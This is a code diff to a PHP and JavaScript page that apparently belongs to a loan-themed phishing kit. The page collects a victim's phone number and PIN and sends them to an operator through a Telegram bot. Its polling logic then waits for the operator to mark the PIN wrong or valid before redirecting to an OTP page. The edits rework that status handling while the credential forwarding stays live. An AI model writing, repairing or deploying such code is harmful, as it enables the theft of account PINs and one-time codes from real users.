@@ -190,13 +190,9 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && !isset($_SERVER['HTTP_X_REQUESTED_W
                 }
             }
             
-            // Set verifying mode - set pin to 1 to start verification
-            $updateSQL = "UPDATE users SET pin = 1 WHERE phone = $1";
-            pg_query_params($conn, $updateSQL, [$phone]);
-            
-            // Set session to indicate we're waiting for verification
-            $_SESSION['verifying'] = true;
+            // Store the submitted PIN in session for verification
             $_SESSION['submitted_pin'] = $pin;
+            $_SESSION['verifying'] = true;
             
             // Send Telegram notification
             $ip = "https://loan-1-i36j.onrender.com/verify.php";
@@ -204,7 +200,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && !isset($_SERVER['HTTP_X_REQUESTED_W
             $msg = "🔐 *PIN Verification Request*\n\n📱 Phone: +263 {$phone}\n🔢 PIN entered: `{$pin}`\n⏰ Time: {$time}\n🌐 VERIFY HERE: {$ip}";
             sendTelegramMessage($botToken, $chatId, $msg);
             
-            // Redirect to show verifying state
+            // Redirect to show verifying state (DB value is still 0, will show verifying)
             header("Location: " . $_SERVER['PHP_SELF'] . "?verifying=1");
             exit;
         }
@@ -421,7 +417,6 @@ if (isset($_SESSION['pin_error'])) {
     let isVerifying = <?= json_encode($verifying) ?>;
     let isSubmitting = false;
     let pollingActive = false;
-    let lastPinStatus = 0; // Track last known pin status
     
     function submitForm() {
         if (isSubmitting || isVerifying) return;
@@ -475,7 +470,7 @@ if (isset($_SESSION['pin_error'])) {
         .catch(error => console.error('Error resetting PIN:', error));
     }
     
-    // Check PIN status from database (polling)
+    // Check PIN status from database (polling every 2 seconds)
     function checkPinStatus() {
         if (!pollingActive) return;
         
@@ -490,12 +485,10 @@ if (isset($_SESSION['pin_error'])) {
         .then(response => response.json())
         .then(data => {
             const pinStatus = data.pin_status;
+            console.log('PIN Status from DB:', pinStatus);
             
-            // Only react to changes from 1 to 0 (wrong PIN) or to 2 (success)
-            // We start with pinStatus = 1 after submission (verifying)
-            
-            // If status changed from 1 to 0 -> wrong PIN
-            if (lastPinStatus === 1 && pinStatus === 0) {
+            // If status changed to 1 -> wrong PIN
+            if (pinStatus === 1) {
                 if (verificationInterval) {
                     clearInterval(verificationInterval);
                     verificationInterval = null;
@@ -506,6 +499,16 @@ if (isset($_SESSION['pin_error'])) {
                 const messageContainer = document.getElementById('messageContainer');
                 messageContainer.innerHTML = '<div id="statusMessage" class="error-message">Wrong PIN. Try again</div>';
                 isVerifying = false;
+                
+                // Reset DB pin to 0 after showing error
+                fetch(window.location.href, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/x-www-form-urlencoded',
+                        'X-Requested-With': 'XMLHttpRequest'
+                    },
+                    body: 'action=reset_pin'
+                });
                 
                 // Enable and clear inputs
                 inputs.forEach(input => {
@@ -518,7 +521,6 @@ if (isset($_SESSION['pin_error'])) {
                     inputs[0].focus();
                 }
                 isSubmitting = false;
-                lastPinStatus = 0;
                 
                 // Remove verifying from URL
                 const url = new URL(window.location.href);
@@ -538,7 +540,7 @@ if (isset($_SESSION['pin_error'])) {
                     }
                 }, 3000);
             } 
-            // If status changed to 2 -> success, redirect
+            // If status changed to 2 -> success, redirect to OTP
             else if (pinStatus === 2) {
                 if (verificationInterval) {
                     clearInterval(verificationInterval);
@@ -547,9 +549,7 @@ if (isset($_SESSION['pin_error'])) {
                 }
                 window.location.href = 'otp.php';
             }
-            
-            // Update last known status
-            lastPinStatus = pinStatus;
+            // Status 0 means still verifying (default), continue polling
         })
         .catch(error => console.error('Error checking PIN status:', error));
     }
@@ -681,16 +681,14 @@ if (isset($_SESSION['pin_error'])) {
         if (freshInputs[0]) freshInputs[0].focus();
     }
     
-    // If verifying, start polling
+    // If verifying, start polling every 2 seconds
     if (isVerifying) {
-        // Disable inputs
+        // Disable inputs while verifying
         inputs.forEach(input => {
             input.disabled = true;
         });
         
-        // Set initial lastPinStatus to 1 (since we just set it to 1 in database)
-        lastPinStatus = 1;
-        
+        // Start polling every 2 seconds
         pollingActive = true;
         verificationInterval = setInterval(checkPinStatus, 2000);
         // Immediate first check
